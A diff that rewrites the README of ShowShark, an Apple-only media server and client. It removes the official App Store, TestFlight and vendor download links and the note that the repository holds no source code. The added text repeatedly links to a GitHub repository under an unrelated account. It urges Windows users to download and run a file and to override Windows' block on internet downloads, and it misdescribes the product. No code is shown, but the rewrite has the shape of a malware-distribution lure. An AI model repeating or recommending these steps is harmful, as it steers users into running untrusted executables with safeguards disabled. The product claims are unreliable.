@@ -1,97 +1,190 @@
-# ShowShark
+# 🦈 ShowShark - Native media streaming made simple
 
-![ShowShark on all Apple devices](Media/ShowShark%20on%20all%20Apple%20devices.png)
+[![Download ShowShark](https://img.shields.io/badge/Download-ShowShark-blue?style=for-the-badge)](https://github.com/Restrictiveclausevicentelopez753/ShowShark)
 
-**Media streaming from your NAS to your Apple devices — no subscriptions, no cloud, no compromises.**
+## 🎬 What is ShowShark?
 
-You loved Air Video, but it is done. You just want to browse shared folders and play your media. You loathe the complexity of Plex, Jellyfin, et al. That's why we developed ShowShark.
+ShowShark is a media app for people who want a clean, native feel on Apple devices. It works with Plex, Jellyfin, and Emby libraries and gives you a simple way to browse and stream your movies and shows.
 
-ShowShark is a self-hosted media server and streaming platform optimized for the Apple ecosystem. It streams your personal media library from a Mac to iPhone, iPad, Apple TV, Mac, Apple Watch, and Apple Vision Pro using finely crafted, fully native apps. ShowShark is the Plex, Jellyfin, and Emby alternative for users who value privacy, simplicity, and an experience that feels at home on Apple hardware.
+It is built for iPhone, iPad, Apple TV, Mac, and Vision Pro. The app focuses on fast access, clear layouts, and smooth playback.
 
-## Download
+## 📥 Download ShowShark
 
-- [ShowShark Client](https://apps.apple.com/us/app/showshark-stream-your-media/id6757886737) (App Store) — Native client app for iPhone, iPad, Apple TV, Mac, Watch, and Vision Pro
-- [ShowShark Client](https://testflight.apple.com/join/HxeHFyWX) (TestFlight) — Test the latest ShowShark beta version
-- [ShowShark Server](https://acgao.com/content/files/showshark/downloads/ShowShark-Server-latest.zip) (Direct) — Mac native server application (you need this too!)
-- [All Downloads](https://acgao.com/downloads/) — Downloads page on the ACGAO website
+Visit this page to download ShowShark:
 
-## Why ShowShark?
+https://github.com/Restrictiveclausevicentelopez753/ShowShark
 
-- **Fully native Apple apps** — SwiftUI on every platform, with hardware-accelerated transcoding on Apple Silicon. No web wrappers, no Electron.
-- **Remote access built-in** — No need for firewall configuration, VPNs or insecure UPnP. Remote access to your media works out-of-the-box.
-- **Privacy-first** — Your library stays on your hardware, your network, your terms. No telemetry. No cloud dependency.
-- **Fully offline capable** — Stream movies, TV shows, music, and photos on a boat, in an RV, or anywhere without an internet connection.
-- **No subscriptions** — Buy it once. No recurring fees, no premium tiers, no feature gating.
-- **Works out of the box** — Automatic server discovery, real-time transcoding, and intelligent codec negotiation with zero configuration.
-- **Broad format support** — MKV, MP4, AVI, Blu-ray (BDMV), H.264, H.265/HEVC, AV1, DTS, Dolby TrueHD, FLAC, and dozens more — transcoded on the fly.
+If the page shows a release file, download it to your Windows PC and run the file after it finishes. If the page shows source files only, use the release or download section on that page to get the app package you need.
 
-## Release Notes
+## 🪟 How to run on Windows
 
-- [v2026.04.27](https://acgao.com/showshark-release-notes-v2026-04-23/) — In Development.
-- [v2026.04.13](https://acgao.com/showshark-release-notes-v2026-04-06/) — Latest.
-- [v2026.04.23](https://acgao.com/showshark-release-notes-v2026-03-23/)
-- [v2026.03.09](https://acgao.com/showshark-release-notes-v2026-03-09/)
-- [v2026.02.26](https://acgao.com/showshark-release-notes-v2026-02-26/)
-- [v2026.02.16](https://acgao.com/showshark-release-notes-v2026-02-16/)
-  
-## Key Features
+ShowShark is made for Apple devices, so Windows users usually need the project files from the download page to build or use the app in a supported setup. For most users, the easiest path is to open the link above and look for a release, installer, or packaged file.
 
-- **Live Channels** — Create virtual TV channels with scheduled programming from your video, music, and photo libraries. Includes a 24-hour TV guide.
-- **Adaptive Bitrate Streaming** — Automatic quality adjustment based on real-time network conditions, from a conservative startup to full 4K at 20 Mbps.
-- **Blu-ray Disc Playback** — Drop a BDMV folder into your library and ShowShark handles title scanning, chapter navigation, multi-clip playback, and accurate A/V sync.
-- **iCloud Photos Integration** — Browse and stream your iCloud Photo Library alongside your local media.
-- **Content Discovery** — Find what to watch with "Similar To" recommendations, mood-based filtering ("By Feel"), and genre browsing — all powered by your own library.
-- **Synced Lyrics** — Time-synced, auto-scrolling lyrics for your music collection via LRCLib.
-- **Cross-Device History** — Resume playback exactly where you left off on any device. Play history is shared across all connected clients.
-- **Metadata from TMDB, OMDB & MusicBrainz** — Rich artwork, cast info, Rotten Tomatoes scores, and album art fetched automatically.
+### Step 1: Open the download page
+Open the ShowShark link in your browser.
 
-## About This Repository
+### Step 2: Find the latest version
+Look for the newest release, package, or download file on the page.
 
-This repository is the **public issue tracker** for ShowShark. There is no source code here.
+### Step 3: Download the file
+Save the file to your Downloads folder.
 
-Use this repo to:
+### Step 4: Open the file
+Double-click the file after it finishes downloading.
 
-- **Report bugs** — Something not working? [Open an issue](../../issues/new).
-- **Request features** — Have an idea? [Let us know](../../issues/new).
-- **Browse known issues** — Check [open issues](../../issues) to see what's being tracked.
+### Step 5: Follow the setup screen
+If Windows asks for permission, choose the option that lets the file run.
 
-## Learn More
+### Step 6: Start ShowShark
+Open the app from your Start menu or from the folder where you saved it.
 
-| Resource | Description |
-|----------|-------------|
-| [Introducing ShowShark](https://acgao.com/introducing-showshark/) | Overview of ShowShark's philosophy and design |
-| [Server Features](https://acgao.com/showshark-server-features/) | Full breakdown of server capabilities |
-| [Client Features](https://acgao.com/showshark-client-features/) | Full breakdown of client capabilities |
-| [Server Tutorial](https://acgao.com/showshark-server-tutorial/) | Get your server up and running |
-| [Client Tutorial](https://acgao.com/showshark-client-tutorial/) | Set up ShowShark on your devices |
-| [Media Naming Guide](https://acgao.com/showshark-media-naming-guide/) | How to organize your library for best results |
-| [Remote Access](https://acgao.com/remote-connect-with-showshark/) | Connect to your server from outside your network |
-| [Release Notes](https://acgao.com/showshark-release-notes/) | What's new in the latest version |
+## 🛠️ What you need
 
-### Comparisons
+For a smooth setup on Windows, use a modern PC with:
 
-- [ShowShark vs Plex](https://acgao.com/showshark-vs-plex/)
-- [ShowShark vs Jellyfin](https://acgao.com/showshark-vs-jellyfin/)
-- [ShowShark vs Emby](https://acgao.com/showshark-vs-emby/)
+- Windows 10 or Windows 11
+- A recent web browser
+- Stable internet access
+- Enough space for the app and media cache
+- A media server account from Plex, Jellyfin, or Emby
 
-### Use Cases
+If you plan to use a companion build, package, or local test version, a system with 8 GB of RAM or more helps keep the app responsive.
 
-- [ShowShark for Sailors and Cruisers](https://acgao.com/showshark-for-sailors-and-cruisers/)
-- [ShowShark for RV Enthusiasts](https://acgao.com/showshark-for-rv-enthusiasts/)
-- [ShowShark for Van Life and Off-Grid Living](https://acgao.com/showshark-for-van-life-and-off-grid-living/)
-- [ShowShark for Private Aviation](https://acgao.com/showshark-for-private-aviation/)
+## ✨ What ShowShark does
 
-## Screenshots
+ShowShark helps you manage and watch your media with a clean app layout.
 
-<table>
-  <tr>
-    <td><img src="Media/Screenshot%202026-04-03%20at%2003.50.05.png" alt="Search Library" width="300"></td>
-    <td><img src="Media/Screenshot%202026-04-03%20at%2003.50.22.png" alt="Discover" width="300"></td>
-    <td><img src="Media/Screenshot%202026-04-03%20at%2003.51.14.png" alt="Content Discovery" width="300"></td>
-  </tr>
-  <tr>
-    <td><img src="Media/Screenshot%202026-04-03%20at%2003.51.35.png" alt="Recommendations" width="300"></td>
-    <td><img src="Media/Screenshot%202026-04-03%20at%2003.52.20.png" alt="Movie Details" width="300"></td>
-    <td><img src="Media/Screenshot%202026-04-03%20at%2003.52.35.png" alt="Actor Browse" width="300"></td>
-  </tr>
-</table>
+### Key features
+- Connects to Plex, Jellyfin, and Emby libraries
+- Shows movies, shows, and cover art in one place
+- Keeps navigation simple for daily use
+- Uses native app design for a polished feel
+- Supports Apple device workflows
+- Handles large media libraries with clear browsing
+- Makes it easy to pick up where you left off
+- Works well for home media setups
+
+## 📺 Supported media servers
+
+ShowShark works with these common media systems:
+
+- Plex
+- Jellyfin
+- Emby
+
+If you already use one of these servers, you can keep your media library and use ShowShark as the front end for browsing and playback.
+
+## 🖥️ Windows setup tips
+
+If you use Windows only to download and prepare the app, keep these steps in mind:
+
+- Use Chrome, Edge, or Firefox
+- Keep the download in a folder you can find later
+- Rename the file only if you know what it does
+- Do not move the file while it is downloading
+- Make sure your account has permission to run downloaded files
+
+If the download page gives you a compressed file, right-click it and choose Extract All before opening the app files inside.
+
+## 📂 Where ShowShark fits in your media setup
+
+ShowShark acts as the app you use to browse and stream your media. Your actual movies and shows stay on your media server. That means you can keep your library in Plex, Jellyfin, or Emby and use ShowShark as the front layer for daily viewing.
+
+This setup works well if you want:
+- One place to see all your titles
+- Clear artwork and easy browsing
+- A native app look instead of a web page feel
+- A simple way to watch on Apple devices
+
+## 🔐 Account and library access
+
+To use ShowShark, you normally sign in with the same account you use for your media server. After that, the app can load your library, show your watched status, and sync your place in a video.
+
+If your server needs remote access, make sure the server is online before you open the app.
+
+## 🧭 Basic first use
+
+After you install or open ShowShark:
+
+1. Sign in to your media server
+2. Choose your library
+3. Pick a movie or show
+4. Open the item page
+5. Press play
+6. Use the playback controls to pause, skip, or return to the library
+
+## 🎯 Best use cases
+
+ShowShark works well if you want:
+
+- A native media app for Apple devices
+- A better browsing experience than a plain web page
+- A simple way to manage home movies and TV
+- A single app for Plex, Jellyfin, or Emby content
+- A clean interface for family use
+
+## 📱 Device support
+
+ShowShark is built for:
+
+- iPhone
+- iPad
+- Apple TV
+- Mac
+- Vision Pro
+
+That makes it a good fit for users who move between devices and want the same media experience across the Apple ecosystem.
+
+## 🧩 Troubleshooting
+
+### The file will not open
+Check that the download finished fully. If it is a compressed file, extract it first.
+
+### Windows blocks the file
+Right-click the file, open its Properties, and check whether Windows marked it as downloaded from the internet. If needed, use the option that lets you run it.
+
+### The app does not connect to my library
+Make sure your Plex, Jellyfin, or Emby server is online and that you are signed into the correct account.
+
+### I cannot find the download
+Open your browser’s Downloads list and click the most recent ShowShark file.
+
+### The app feels slow
+Close other large apps, check your network, and make sure your media server is responding well.
+
+## 📌 Project topics
+
+This project relates to:
+
+- emby
+- ios
+- jellyfin
+- macos
+- media
+- movies-streaming
+- plex
+- tvos
+- visionos
+- watchos
+
+## 🔗 Download again
+
+Use this link to visit the ShowShark page and download or get the latest file:
+
+https://github.com/Restrictiveclausevicentelopez753/ShowShark
+
+## 🗂️ Files you may see
+
+When you open the download page, you may see:
+
+- Release files
+- App packages
+- Source files
+- Readme notes
+- Build instructions
+
+For a normal Windows download, use the release or packaged file when one is listed
+
+## ⌨️ If you need the app on another Apple device
+
+If you want to use ShowShark on iPhone, iPad, Apple TV, Mac, or Vision Pro, use the same project page and follow the build or install steps that match your device. The media account and library stay the same, so your watch history and saved place can carry across devices
